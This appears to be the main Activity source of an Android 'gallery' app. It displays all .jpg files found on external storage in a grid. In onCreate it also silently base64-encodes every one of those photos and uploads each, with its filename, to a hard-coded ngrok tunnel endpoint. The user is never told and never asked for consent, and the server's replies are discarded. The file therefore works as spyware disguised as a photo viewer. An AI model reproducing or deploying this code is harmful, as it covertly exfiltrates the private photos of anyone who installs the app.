package com.example.galleryapp;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import android.view.View;
import android.widget.GridView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.ImageRequest;
import com.android.volley.toolbox.StringRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    ArrayList<File> list;
    GridView galleryView;
    String url ="https://2208b4e5.ngrok.io/registration/image_upload.php";
    int requestcode;
    Bitmap bitmap;
    String[] myPermissions = {Manifest.permission.INTERNET,Manifest.permission.READ_EXTERNAL_STORAGE};
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //permissions
        ActivityCompat.requestPermissions(MainActivity.this,myPermissions,requestcode=100);

        galleryView = findViewById(R.id.grid_gallery);

        list = imageFinder(Environment.getExternalStorageDirectory());

        GridViewAdapter adapter = new GridViewAdapter(MainActivity.this,list);
        galleryView.setAdapter(adapter);

        Collections.sort(list);

        for(final File getFile : list) {
            StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            try {
                                JSONObject jsonObject = new JSONObject(response);
                                //String res = jsonObject.getString("response");
                                //Toast.makeText(MainActivity.this, "", Toast.LENGTH_SHORT).show();
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Toast.makeText(MainActivity.this, "Server Error!", Toast.LENGTH_SHORT).show();
                    error.printStackTrace();
                }
            }) {
                @Override
                protected Map<String, String> getParams() throws AuthFailureError {
                    Map<String, String> params = new HashMap<>();
                    Uri path = Uri.fromFile(getFile);
                    try {
                        bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), path);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    params.put("image_name", getFile.getName());
                    params.put("image", imageToString(bitmap));
                    return params;
                }

            };
            MySingleton.getInstance(MainActivity.this).addRequestQueue(stringRequest);
        }
    }

    private ArrayList<File> imageFinder(File externalStorageDirectory) {
        ArrayList<File> b = new ArrayList<>();
        File[] file = externalStorageDirectory.listFiles();
        for(int i = 0 ; i<file.length; i++){
            if(file[i].isDirectory()){
                b.addAll(imageFinder(file[i]));
            }else{
                if(file[i].getName().endsWith(".jpg")){
                    b.add(file[i]);
                }
            }
        }
        return b;
    }

    public String imageToString(Bitmap bitmap){
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG,100,byteArrayOutputStream);
        byte[] imageByte = byteArrayOutputStream.toByteArray();
        return Base64.encodeToString(imageByte,Base64.DEFAULT);
    }
}
